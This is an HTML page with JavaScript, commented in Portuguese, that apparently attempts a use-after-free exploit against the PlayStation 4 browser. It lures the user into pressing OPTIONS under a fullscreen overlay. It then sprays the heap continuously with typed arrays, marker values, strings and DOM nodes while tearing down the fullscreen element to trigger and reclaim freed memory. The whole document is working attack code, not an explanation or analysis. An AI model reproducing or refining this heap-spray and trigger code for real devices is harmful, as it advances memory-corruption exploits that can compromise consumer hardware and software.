<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Aggressive Reclaim REAL</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>Aggressive Reclaim (Real)</h2>
<button onclick="run()">Run</button>

<div id="log"></div>

<script>
function log(msg){
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

function setupHeap(){
    let controllers = [];
    for(let i = 0; i < 5000; i++){
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

function setupFS(){
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
    fsTarget.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen();
    return fsTarget;
}

// 🔥 LOOP AGRESSIVO CONTÍNUO
function startAggressiveReclaim(){
    log("[*] Aggressive reclaim LOOP iniciado");

    let running = true;

    function sprayRound(){
        if (!running) return;

        let junk = [];

        // 🔥 mistura pesada
        for(let i = 0; i < 2000; i++){

            // ArrayBuffer
            let buf = new ArrayBuffer(0x100);
            let f64 = new Float64Array(buf);
            f64[0] = 13.37;

            // Uint32
            let u32 = new Uint32Array(buf);
            u32[0] = 0x41414141;

            // string
            let str = "REUSE_" + i + "_" + Math.random();

            // DOM
            let div = document.createElement("div");
            div.textContent = str;

            junk.push(f64);
            junk.push(u32);
            junk.push(str);
            junk.push(div);
        }

        // 🔥 força GC parcial
        junk = null;

        // loop contínuo
        setTimeout(sprayRound, 0);
    }

    sprayRound();

    return () => { running = false; };
}

function trigger(fsTarget){
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e){
        log("[ERRO] " + e);
    }

    // 🔴 NÃO MEXER
    setTimeout(() => location.reload(), 500);
}

function run(){
    log("Running... Press OPTIONS");

    let controllers = setupHeap();
    let fsTarget = setupFS();

    window.onblur = function(){
        log("[*] onblur");

        setTimeout(() => {

            log("[*] Janela crítica iniciada");

            // 🔥 começa reclaim CONTÍNUO
            let stopReclaim = startAggressiveReclaim();

            // pequeno delay pra acumular pressão
            setTimeout(() => {

                trigger(fsTarget);

                // opcional: parar depois
                setTimeout(() => stopReclaim(), 200);

            }, 50);

        }, 3000);
    };
}
</script>

</body>
</html>
